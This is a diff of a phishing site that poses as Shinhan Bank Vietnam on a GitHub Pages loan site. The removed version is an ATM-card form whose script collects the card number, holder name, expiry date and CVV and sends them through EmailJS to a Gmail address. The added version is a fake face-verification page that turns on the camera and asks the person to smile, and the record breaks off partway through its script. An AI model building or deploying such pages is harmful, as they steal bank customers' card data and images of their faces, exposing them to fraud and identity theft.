@@ -3,792 +3,529 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thông Tin Thẻ ATM - Shinhan Bank</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <title>Quét khuôn mặt</title>
     <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            font-size: 16px;
-            background-color: #f8f9fa;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
         }
-        .header {
-            padding: 15px;
-            background-color: #ffffff;
-            border-bottom: 1px solid #b3cde0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .header img {
-            height: 35px;
-        }
-        .header-icons {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        .header-icons i {
-            font-size: 24px;
-            cursor: pointer;
-            color: #0052cc;
-        }
-        .container {
-            max-width: 90%;
-            width: 100%;
-            margin: 0 auto;
-            padding: 25px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative;
-        }
-        @media (min-width: 768px) {
-            .container {
-                max-width: 700px;
-                margin: 0 auto;
-            }
-        }
-        .nav-tabs {
-            display: flex;
-            justify-content: space-around;
-            margin-bottom: 25px;
-            margin-top: 0;
-            flex-wrap: nowrap;
-        }
-        .nav-tabs .nav-item {
-            flex: 1;
-            text-align: center;
-        }
-        .nav-tabs .nav-link {
-            background-color: #d3d3d3;
-            color: #ffffff;
-            border-radius: 20px;
-            padding: 8px 16px;
-            font-weight: 500;
-            font-size: 14px;
-            width: 100%;
-            margin: 0 5px;
-            white-space: nowrap;
-        }
-        .nav-tabs .nav-link.active {
-            background-color: #0033a0;
-            color: #ffffff;
-        }
-        @media (max-width: 767px) {
-            .nav-tabs .nav-link {
-                font-size: 8px;
-                padding: 4px 6px;
-            }
-        }
-        .step-title {
-            color: #003087;
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            text-align: center;
-        }
-        .step-description {
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 20px;
-            color: #1a3c87;
-        }
-        .file-upload-box {
-            border: 2px dashed #b3cde0;
-            border-radius: 20px;
-            padding: 15px;
-            text-align: center;
-            background-color: #f9f9f9;
-            width: 100%;
-            max-width: 500px;
-            height: 120px;
+
+        body {
+            background-color: #0f2a44;
+            color: white;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            margin: 0 auto;
-            position: relative;
+            justify-content: center; /* Căn giữa theo chiều dọc */
+            height: 100vh;
+            overflow: hidden;
         }
-        .file-upload-box label {
-            cursor: pointer;
-            color: #003087;
-            font-weight: 500;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
-        .file-upload-box input {
-            display: none;
-        }
-        .file-info {
-            margin-top: 5px;
-            font-size: 12px;
-            color: #666;
-            position: absolute;
-            bottom: 5px;
+
+        .status-bar {
             width: 100%;
-            text-align: center;
+            height: 40px;
+            background-color: transparent;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between; /* Căn nút đóng và logo */
+            padding: 0 10px;
         }
-        .file-preview {
-            max-width: 100%;
-            max-height: 80px;
-            margin-top: 5px;
-            display: none;
-            object-fit: contain;
-        }
-        .btn-primary {
-            background-color: #0033a0;
+
+        .close-button {
+            background-color: #ffffff33;
             border: none;
-            border-radius: 20px;
-            padding: 10px 20px;
-            font-weight: 700;
-            font-size: 14px;
-            transition: background-color 0.3s ease;
-            margin: 5px;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 16px;
+            color: white;
         }
-        .btn-primary:hover {
-            background-color: #0052cc;
+
+        .close-button:hover {
+            background-color: #ffffff66;
         }
-        .btn-primary:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
+
+        .logo {
+            height: 30px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
         }
-        .btn-primary.small {
-            padding: 6px 12px;
-            font-size: 14px;
-        }
-        .btn-danger {
-            background-color: #ff4d4f;
-            border: none;
-            border-radius: 20px;
-            padding: 6px 12px;
-            font-weight: 700;
-            font-size: 14px;
-            transition: background-color 0.3s ease;
-            margin: 5px;
-        }
-        .btn-danger:hover {
-            background-color: #e63946;
-        }
-        .capture-btn {
-            background-color: #0033a0;
-            border: none;
-            border-radius: 20px;
-            padding: 6px 12px;
-            font-weight: 500;
-            font-size: 14px;
-            color: #ffffff;
-            margin-top: 5px;
-            transition: background-color 0.3s ease;
-        }
-        .capture-btn:hover {
-            background-color: #0052cc;
-        }
-        .capture-btn i {
-            margin-right: 5px;
-        }
-        .footer {
+
+        .container {
             text-align: center;
             padding: 20px;
-            background-color: #003087;
-            color: white;
-            margin-top: 20px;
-            font-size: 12px;
+            max-width: 100%;
         }
-        .footer-links a {
-            color: #b3cde0;
-            margin: 0 10px;
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            color: #ffffff;
-        }
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 15px;
-        }
-        .error-message {
-            color: #dc3545;
-            font-size: 14px;
-            font-weight: 500;
-            text-align: center;
-            margin-top: 5px;
-            padding: 8px;
-            background-color: #ffe6e6;
-            border-radius: 5px;
-            display: none;
-        }
-        .form-label {
+
+        .header {
+            font-size: 20px;
             font-weight: 400;
-            color: #1a3c87;
-            font-size: 14px;
-            margin-bottom: 5px;
-            text-align: center;
-            width: 100%;
+            margin-bottom: 10px;
         }
-        .form-group {
+
+        .sub-header {
+            font-size: 14px;
+            font-weight: 300;
+            margin-bottom: 20px;
+            color: #ffffffcc;
+        }
+
+        .face-scan-container {
             position: relative;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #d3d3d3;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            width: 220px;
+            height: 220px;
+            margin: 0 auto;
         }
-        .form-group:last-child {
-            border-bottom: none;
-        }
-        .divider-blue {
-            border-top: 1px solid #b3cde0;
-            margin: 15px 0;
-        }
-        .action-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 10px;
-        }
-        .modal-content .form-label {
-            text-align: left;
-            width: auto;
-        }
-        .modal-content .form-control {
-            border-radius: 20px;
-            border: 1px solid #b3cde0;
-            padding: 8px 12px;
-            font-size: 14px;
-            height: 40px;
-        }
-        .modal-section-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #003087;
-            margin-top: 15px;
-            margin-bottom: 10px;
-        }
-        .messenger-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #0084ff;
-            width: 60px;
-            height: 60px;
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            z-index: 1000;
-            transition: transform 0.2s;
-            animation: pulse 2s infinite;
+            border: 5px solid #ffffff33;
+            background-color: #ffffff;
+            overflow: hidden;
         }
-        .messenger-btn:hover {
-            transform: scale(1.1);
-            animation: none;
+
+        .video {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
         }
-        .messenger-btn img {
-            width: 40px;
-            height: 40px;
+
+        .scan-circle {
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            width: 230px;
+            height: 230px;
+            border-radius: 50%;
         }
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+
+        .dot {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background-color: #ffffff66;
+            border-radius: 50%;
+            transform-origin: center;
+            box-shadow: 0 0 3px #ffffff66;
+        }
+
+        .dot.scanning {
+            animation: blink 1.2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 0.3;
+                box-shadow: 0 0 3px #ffffff66;
             }
             50% {
-                transform: scale(1.05);
-                box-shadow: 0 4px 15px rgba(0, 132, 255, 0.4);
-            }
-            100% {
-                transform: scale(1);
-                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+                opacity: 1;
+                box-shadow: 0 0 6px #ffffffcc;
             }
         }
-        .dropdown-menu {
-            min-width: 200px;
+
+        .scan-arrow {
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            color: #ffffff66;
         }
-        .dropdown-menu a {
-            color: #0033a0;
+
+        .scan-arrow.scanning {
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: translateX(-50%) rotate(0deg);
+            }
+            to {
+                transform: translateX(-50%) rotate(360deg);
+            }
+        }
+
+        .mic-button {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background-color: #ffffff33;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .mic-button.active {
+            background-color: #ffffff66;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            font-size: 24px;
+            font-weight: 500;
             text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .status-message.fade {
+            opacity: 0;
+        }
+
+        .status-message span {
+            font-size: 24px;
+        }
+
+        .error-message {
+            margin-top: 10px;
+            color: #ff5555;
             font-size: 14px;
-            padding: 8px 12px;
+            display: none;
         }
-        .dropdown-menu a:hover {
-            background-color: #e6f0fa;
-            color: #0052cc;
+
+        @media (max-width: 400px) {
+            .container {
+                padding: 10px;
+            }
+
+            .header {
+                font-size: 18px;
+                margin-bottom: 8px;
+            }
+
+            .sub-header {
+                font-size: 12px;
+                margin-bottom: 15px;
+            }
+
+            .face-scan-container {
+                width: 220px;
+                height: 220px;
+            }
+
+            .scan-circle {
+                width: 230px;
+                height: 230px;
+                top: -5px;
+                left: -5px;
+            }
+
+            .scan-arrow {
+                font-size: 20px;
+                bottom: -25px;
+            }
+
+            .status-message {
+                margin-top: 15px;
+                font-size: 20px;
+            }
+
+            .status-message span {
+                font-size: 20px;
+            }
+
+            .logo {
+                height: 26px;
+            }
         }
-        @media (max-width: 767px) {
-            .modal-title {
+
+        @media (max-width: 350px) {
+            .container {
+                padding: 8px;
+            }
+
+            .header {
                 font-size: 16px;
-                white-space: normal;
-                overflow: visible;
+                margin-bottom: 6px;
+            }
+
+            .sub-header {
+                font-size: 11px;
+                margin-bottom: 10px;
+            }
+
+            .face-scan-container {
+                width: 200px;
+                height: 200px;
+            }
+
+            .scan-circle {
+                width: 210px;
+                height: 210px;
+                top: -5px;
+                left: -5px;
+            }
+
+            .scan-arrow {
+                font-size: 18px;
+                bottom: -20px;
+            }
+
+            .status-message {
+                margin-top: 10px;
+                font-size: 18px;
+            }
+
+            .status-message span {
+                font-size: 18px;
+            }
+
+            .logo {
+                height: 22px;
+            }
+        }
+
+        @media (max-width: 320px) {
+            .container {
+                padding: 5px;
+            }
+
+            .header {
+                font-size: 14px;
+                margin-bottom: 5px;
+            }
+
+            .sub-header {
+                font-size: 10px;
+                margin-bottom: 8px;
+            }
+
+            .face-scan-container {
+                width: 180px;
+                height: 180px;
+            }
+
+            .scan-circle {
+                width: 190px;
+                height: 190px;
+                top: -5px;
+                left: -5px;
+            }
+
+            .scan-arrow {
+                font-size: 16px;
+                bottom: -18px;
+            }
+
+            .status-message {
+                margin-top: 8px;
+                font-size: 16px;
+            }
+
+            .status-message span {
+                font-size: 16px;
+            }
+
+            .mic-button {
+                width: 36px;
+                height: 36px;
+                font-size: 18px;
+            }
+
+            .close-button {
+                width: 26px;
+                height: 26px;
+                font-size: 14px;
+            }
+
+            .logo {
+                height: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <div class="header-icons">
-            <i class="bi bi-search"></i>
-            <div class="dropdown">
-                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
-                <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">XEM KẾT QUẢ</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
-                    <li><a class="dropdown-item" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
-                    <li><a class="dropdown-item" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">MESSENGER</a></li>
-                </ul>
-            </div>
-        </div>
+    <div class="status-bar">
+        <button class="close-button" id="close-button">✖</button>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" class="logo" alt="Shinhan Bank Logo">
     </div>
-    <hr class="divider-blue" style="margin: 0;">
-
     <div class="container">
-        <ul class="nav-tabs">
-            <li class="nav-item">
-                <a class="nav-link" href="#">1. Nhập thông tin</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link active" href="#">3. Hoàn thành</a>
-            </li>
-        </ul>
-
-        <div id="step3" class="step-transition">
-            <h5 class="step-title">Thông Tin Thẻ ATM</h5>
-            <p class="step-description">Vui lòng tải lên ảnh mặt trước và mặt sau thẻ ATM hoặc nhập thông tin thẻ thủ công. Đảm bảo ảnh rõ nét, không mờ.</p>
-            <div class="form-group">
-                <label for="atmCardFrontImage" class="form-label">Hình Ảnh Mặt Trước Thẻ ATM</label>
-                <div class="file-upload-box">
-                    <label for="atmCardFrontImage" aria-label="Tải lên hình ảnh mặt trước thẻ ATM">Chụp ảnh hoặc tải lên</label>
-                    <input type="file" id="atmCardFrontImage" accept="image/jpeg,image/png">
-                    <button type="button" class="capture-btn" onclick="captureImage('atmCardFrontImage')" tabindex="0" aria-label="Chụp ảnh mặt trước thẻ ATM"><i class="bi bi-camera"></i> Chụp ảnh</button>
-                    <div class="file-info" id="atmCardFrontInfo" aria-live="polite"></div>
-                    <img class="file-preview" id="atmCardFrontPreview">
-                    <div class="error-message" id="atmCardFrontError"></div>
-                </div>
-                <div class="action-buttons">
-                    <button type="button" class="btn btn-danger" onclick="clearImage('atmCardFrontImage')" tabindex="0" aria-label="Xóa hình ảnh mặt trước thẻ ATM">Xóa Ảnh</button>
-                    <button type="button" class="btn btn-primary small" data-bs-toggle="modal" data-bs-target="#manualInputModal">Nhập Thủ Công</button>
-                </div>
+        <div class="header">Xác thực khuôn mặt</div>
+        <div class="sub-header">Hãy để khuôn mặt vào hình tròn</div>
+        <div class="face-scan-container">
+            <div class="video-wrapper">
+                <video id="video" class="video" autoplay></video>
             </div>
-
-            <hr class="divider-blue">
-
-            <div class="form-group">
-                <label for="atmCardBackImage" class="form-label">Hình Ảnh Mặt Sau Thẻ ATM</label>
-                <div class="file-upload-box">
-                    <label for="atmCardBackImage" aria-label="Tải lên hình ảnh mặt sau thẻ ATM">Chụp ảnh hoặc tải lên</label>
-                    <input type="file" id="atmCardBackImage" accept="image/jpeg,image/png">
-                    <button type="button" class="capture-btn" onclick="captureImage('atmCardBackImage')" tabindex="0" aria-label="Chụp ảnh mặt sau thẻ ATM"><i class="bi bi-camera"></i> Chụp ảnh</button>
-                    <div class="file-info" id="atmCardBackInfo" aria-live="polite"></div>
-                    <img class="file-preview" id="atmCardBackPreview">
-                    <div class="error-message" id="atmCardBackError"></div>
-                </div>
-                <div class="action-buttons">
-                    <button type="button" class="btn btn-danger" onclick="clearImage('atmCardBackImage')" tabindex="0" aria-label="Xóa hình ảnh mặt sau thẻ ATM">Xóa Ảnh</button>
-                    <button type="button" class="btn btn-primary small" data-bs-toggle="modal" data-bs-target="#manualInputModal">Nhập Thủ Công</button>
-                </div>
-            </div>
-
-            <hr class="divider-blue">
-
-            <div class="button-group">
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html" class="btn btn-primary">QUAY LẠI</a>
-                <button id="proceedToStep4Btn" class="btn btn-primary" disabled>BƯỚC KẾ TIẾP</button>
-            </div>
+            <div class="scan-circle" id="scan-circle"></div>
+            <div class="mic-button" id="mic-button">🎙️</div>
+            <div class="scan-arrow" id="scan-arrow">⟳</div>
         </div>
-
-        <!-- Modal: Manual Input -->
-        <div class="modal fade" id="manualInputModal" tabindex="-1" aria-labelledby="manualInputModalLabel" role="dialog">
-            <div class="modal-dialog">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title" id="manualInputModalLabel">Nhập Thông Tin Thẻ Thủ Công</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
-                    </div>
-                    <div class="modal-body">
-                        <div class="modal-section-title">Mặt Trước</div>
-                        <div class="mb-3">
-                            <label for="cardNumber" class="form-label">Số Thẻ</label>
-                            <input type="text" class="form-control" id="cardNumber" required placeholder="Nhập 16 số">
-                            <div class="invalid-feedback">Vui lòng nhập số thẻ (16 số).</div>
-                        </div>
-                        <div class="mb-3">
-                            <label for="cardHolderName" class="form-label">Tên In Trên Thẻ</label>
-                            <input type="text" class="form-control" id="cardHolderName" required>
-                            <div class="invalid-feedback">Vui lòng nhập tên in trên thẻ.</div>
-                        </div>
-                        <div class="mb-3">
-                            <label for="issueDate" class="form-label">Ngày Phát Hành</label>
-                            <input type="text" class="form-control" id="issueDate" required placeholder="DD/MM/YYYY">
-                            <div class="invalid-feedback">Vui lòng nhập ngày phát hành (DD/MM/YYYY).</div>
-                        </div>
-                        <div class="mb-3">
-                            <label for="expiryDate" class="form-label">Ngày Hết Hạn</label>
-                            <input type="text" class="form-control" id="expiryDate" required placeholder="MM/YY">
-                            <div class="invalid-feedback">Vui lòng nhập ngày hết hạn (MM/YY).</div>
-                        </div>
-                        <div class="modal-section-title">Mặt Sau</div>
-                        <div class="mb-3">
-                            <label for="cvv" class="form-label">Mã CVV</label>
-                            <input type="text" class="form-control" id="cvv" required placeholder="Nhập 3 số">
-                            <div class="invalid-feedback">Vui lòng nhập mã CVV (3 số).</div>
-                        </div>
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-primary" id="saveCardInfo">Lưu</button>
-                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
-                    </div>
-                </div>
-            </div>
+        <div class="status-message" id="status-message">
+            VUI LÒNG CƯỜI <span>😊</span>
         </div>
-
-        <div class="footer">
-            <div class="footer-links">
-                <a href="#">Chính sách bảo mật</a> |
-                <a href="#">Điều khoản sử dụng</a> |
-                <a href="#">Chính sách Cookies</a> |
-                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
-                <a href="#">Hướng dẫn truy cập web</a> |
-                <a href="#">Sitemap</a>
-            </div>
-            <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
-            <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
+        <div class="error-message" id="error-message">
+            Không thể phát hiện khuôn mặt. Vui lòng thử lại ở nơi có ánh sáng tốt.
         </div>
-
-        <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216" target="_blank" class="messenger-btn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/be/Facebook_Messenger_logo_2020.svg" alt="Messenger Logo">
-        </a>
     </div>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4.0.9/dist/tesseract.min.js"></script>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Khởi tạo EmailJS với Public Key
-        emailjs.init("OrBsI926QI2_xBh1f");
+        const video = document.getElementById('video');
+        const errorMessage = document.getElementById('error-message');
+        const statusMessage = document.getElementById('status-message');
+        const micButton = document.getElementById('mic-button');
+        const scanCircle = document.getElementById('scan-circle');
+        const scanArrow = document.getElementById('scan-arrow');
+        const closeButton = document.getElementById('close-button');
 
-        let userData = {
-            fullName: "",
-            idNumber: "",
-            idIssueDate: "",
-            idIssuePlace: "",
-            address: "",
-            occupation: "",
-            income: "",
-            phoneNumber: "",
-            email: "duyenduyenduyen318@gmail.com",
-            loanAmount: "",
-            loanTerm: "",
-            loanPurpose: "",
-            accountNumber: "",
-            bankName: "",
-            termsAgree: false,
-            loanCode: "",
-            registrationDate: "",
-            monthlyPayment: 0,
-            interestRate: 0,
-            sellerCode: "",
-            storeCode: "",
-            staffCode: "",
-            staffName: "",
-            branchName: "",
-            isRegistered: false,
-            qrData: {},
-            atmCard: {
-                cardNumber: "",
-                cardHolderName: "",
-                issueDate: "",
-                expiryDate: "",
-                cvv: "",
-                frontImage: "",
-                backImage: ""
-            },
-            currentStep: 3
-        };
+        // Tạo các chấm nhỏ cho hiệu ứng quét
+        const numDots = 30;
+        let radius = 115; // Bán kính vòng tròn (230px / 2)
+        if (window.innerWidth <= 400) radius = 115;
+        if (window.innerWidth <= 350) radius = 105;
+        if (window.innerWidth <= 320) radius = 95;
+        for (let i = 0; i < numDots; i++) {
+            const angle = (i / numDots) * 2 * Math.PI;
+            const dot = document.createElement('div');
+            dot.className = 'dot';
+            dot.style.left = `${radius + radius * Math.cos(angle)}px`;
+            dot.style.top = `${radius + radius * Math.sin(angle)}px`;
+            scanCircle.appendChild(dot);
+        }
 
-        function loadUserData() {
-            try {
-                const storedData = localStorage.getItem('userData');
-                if (storedData) {
-                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
-                    console.log('Loaded userData:', userData);
+        // Cập nhật thông điệp trạng thái với hiệu ứng fade
+        function updateStatusMessage(message, includeEmoji = false) {
+            statusMessage.classList.add('fade');
+            setTimeout(() => {
+                statusMessage.innerHTML = includeEmoji ? `${message} <span>😊</span>` : message;
+                statusMessage.classList.remove('fade');
+            }, 300);
+        }
+
+        // Bật/tắt hiệu ứng quét (bao gồm cả chấm nhỏ và mũi tên xoay)
+        function toggleScanEffect(enable) {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach(dot => {
+                if (enable) {
+                    dot.classList.add('scanning');
+                    scanArrow.classList.add('scanning');
+                } else {
+                    dot.classList.remove('scanning');
+                    scanArrow.classList.remove('scanning');
                 }
-            } catch (error) {
-                console.error('Error parsing userData:', error);
-            }
-        }
-
-        function saveToLocalStorage() {
-            try {
-                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
-                localStorage.setItem('userData', encryptedData);
-                console.log('Saved userData:', userData);
-            } catch (error) {
-                console.error('Error saving userData:', error);
-            }
-        }
-
-        function captureImage(inputId) {
-            const input = document.getElementById(inputId);
-            input.setAttribute('capture', 'environment');
-            input.click();
-        }
-
-        function validateFile(file, inputId) {
-            if (!file) return false;
-            const maxSize = 5 * 1024 * 1024;
-            const validTypes = ['image/jpeg', 'image/png'];
-            if (!validTypes.includes(file.type)) {
-                $(`#${inputId}Error`).text('Vui lòng chọn file JPEG hoặc PNG.').show();
-                return false;
-            }
-            if (file.size > maxSize) {
-                $(`#${inputId}Error`).text('File quá lớn. Vui lòng chọn file dưới 5MB.').show();
-                return false;
-            }
-            const img = new Image();
-            img.src = URL.createObjectURL(file);
-            return new Promise((resolve) => {
-                img.onload = () => {
-                    if (img.width < 300 || img.height < 200) {
-                        $(`#${inputId}Error`).text('Ảnh quá nhỏ. Độ phân giải tối thiểu 300x200.').show();
-                        resolve(false);
-                    } else {
-                        resolve(true);
-                    }
-                };
-                img.onerror = () => {
-                    $(`#${inputId}Error`).text('Không thể tải ảnh. Vui lòng thử lại.').show();
-                    resolve(false);
-                };
             });
         }
 
-        function validateCardInfo() {
-            const cardNumber = $('#cardNumber').val().trim();
-            const cardHolderName = $('#cardHolderName').val().trim();
-            const issueDate = $('#issueDate').val().trim();
-            const expiryDate = $('#expiryDate').val().trim();
-            const cvv = $('#cvv').val().trim();
-
-            if (!cardNumber.match(/^\d{16}$/)) {
-                $('#cardNumber').addClass('is-invalid');
-                $('#cardNumber').next('.invalid-feedback').text('Số thẻ phải có 16 số.');
-                return false;
-            } else {
-                $('#cardNumber').removeClass('is-invalid');
-            }
-            if (!cardHolderName) {
-                $('#cardHolderName').addClass('is-invalid');
-                return false;
-            } else {
-                $('#cardHolderName').removeClass('is-invalid');
-            }
-            if (!issueDate.match(/\d{2}\/\d{2}\/\d{4}/)) {
-                $('#issueDate').addClass('is-invalid');
-                $('#issueDate').next('.invalid-feedback').text('Ngày phát hành: DD/MM/YYYY.');
-                return false;
-            } else {
-                $('#issueDate').removeClass('is-invalid');
-            }
-            if (!expiryDate.match(/\d{2}\/\d{2}/)) {
-                $('#expiryDate').addClass('is-invalid');
-                $('#expiryDate').next('.invalid-feedback').text('Ngày hết hạn: MM/YY.');
-                return false;
-            } else {
-                $('#expiryDate').removeClass('is-invalid');
-            }
-            if (!cvv.match(/^\d{3}$/)) {
-                $('#cvv').addClass('is-invalid');
-                $('#cvv').next('.invalid-feedback').text('CVV phải có 3 số.');
-                return false;
-            } else {
-                $('#cvv').removeClass('is-invalid');
-            }
-            return true;
-        }
-
-        function clearImage(inputId) {
-            $(`#${inputId}`).val('');
-            $(`#${inputId}Info`).text('');
-            $(`#${inputId}Preview`).hide();
-            $(`#${inputId}Error`).hide();
-            if (inputId === 'atmCardFrontImage') {
-                userData.atmCard.frontImage = '';
-            } else if (inputId === 'atmCardBackImage') {
-                userData.atmCard.backImage = '';
-            }
-            saveToLocalStorage();
-            updateButtonState();
-        }
-
-        function updateButtonState() {
-            const hasFrontImage = $('#atmCardFrontImage').prop('files').length > 0;
-            const hasBackImage = $('#atmCardBackImage').prop('files').length > 0;
-            const hasCardInfo = userData.atmCard && userData.atmCard.cardNumber && userData.atmCard.cardHolderName && userData.atmCard.issueDate && userData.atmCard.expiryDate && userData.atmCard.cvv;
-            console.log('Button state:', { hasFrontImage, hasBackImage, hasCardInfo });
-            $('#proceedToStep4Btn').prop('disabled', !((hasFrontImage && hasBackImage) || hasCardInfo));
-        }
-
-        async function sendEmail() {
+        // Truy cập camera
+        async function startCamera() {
             try {
-                console.log('Sending email with data:', {
-                    cardNumber: userData.atmCard.cardNumber ? CryptoJS.AES.decrypt(userData.atmCard.cardNumber, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8) : '',
-                    cardHolderName: userData.atmCard.cardHolderName || '',
-                    issueDate: userData.atmCard.issueDate || '',
-                    expiryDate: userData.atmCard.expiryDate || '',
-                    cvv: userData.atmCard.cvv ? CryptoJS.AES.decrypt(userData.atmCard.cvv, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8) : '',
-                    fullName: userData.fullName || '',
-                    email: userData.email || 'duyenduyenduyen318@gmail.com'
+                updateStatusMessage('Đang khởi động camera...');
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false
                 });
-                await emailjs.send("service_60tgxof", "template_m26sq6s", {
-                    cardNumber: userData.atmCard.cardNumber ? CryptoJS.AES.decrypt(userData.atmCard.cardNumber, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8) : '',
-                    cardHolderName: userData.atmCard.cardHolderName || '',
-                    issueDate: userData.atmCard.issueDate || '',
-                    expiryDate: userData.atmCard.expiryDate || '',
-                    cvv: userData.atmCard.cvv ? CryptoJS.AES.decrypt(userData.atmCard.cvv, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8) : '',
-                    fullName: userData.fullName || '',
-                    email: userData.email || 'duyenduyenduyen318@gmail.com'
-                });
-                console.log("Email sent successfully!");
-            } catch (error) {
-                console.error("Email sending failed:", error);
-                alert("Không thể gửi email. Vui lòng thử lại sau.");
+                video.srcObject = stream;
+                detectFace();
+            } catch (err) {
+                console.error('Lỗi khi truy cập camera:', err);
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Không thể truy cập camera. Vui lòng kiểm tra quyền truy cập.';
+                updateStatusMessage('Lỗi camera');
             }
         }
 
-        async function proceedToNextStep() {
